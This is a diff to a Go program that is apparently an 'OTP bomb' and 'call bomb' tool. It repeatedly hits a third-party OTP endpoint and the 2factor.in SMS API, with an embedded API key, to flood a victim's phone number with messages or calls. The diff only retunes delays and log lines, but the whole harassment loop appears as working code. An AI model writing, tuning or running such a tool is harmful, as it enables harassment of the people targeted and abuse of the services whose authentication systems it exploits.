@@ -58,8 +58,8 @@ func main() {
 	if _, err = fmt.Scan(&typeofc); err != nil {
 		pauses(err.Error(), 1)
 	}
+	log.Printf("Starting CALL BOMB; Please wait for %d seconds ...\n", times*15)
 	if typeofc == 1 {
-		log.Printf("Starting OTP BOMB; Please wait for %d seconds ...\n", times*10)
 		for i := 0; i < times; i++ {
 			postData, _ := json.Marshal(map[string]string{"phone": phoneNumber})
 			req, _ := http.NewRequest("POST", "https://server.elitewin.in/sendOtp", bytes.NewBuffer(postData))
@@ -73,20 +73,19 @@ func main() {
 				pauses(err.Error(), 1)
 			}
 			_ = resp.Body.Close()
-			time.Sleep(10 * time.Second)
+			time.Sleep(15 * time.Second)
 		}
 	} else if typeofc == 2 {
-		log.Printf("Starting CALL BOMB; Please wait for %d seconds ...\n", times*3)
 		for i := 0; i < times; i++ {
 			resp, err := http.Get(fmt.Sprintf("https://2factor.in/API/V1/49e550ce-304d-11ee-addf-0200cd936042/SMS/+91%s/AUTOGEN/ELITEW", phoneNumber))
 			if err != nil {
 				pauses(err.Error(), 1)
 			}
 			_ = resp.Body.Close()
-			time.Sleep(3 * time.Second)
+			time.Sleep(15 * time.Second)
 		}
 	} else {
 		pauses("Please enter 1 or 2 in type!", 1)
 	}
-	log.Println("Success!\nBye!")
+	pauses("Success!\nBye!", 0)
 }
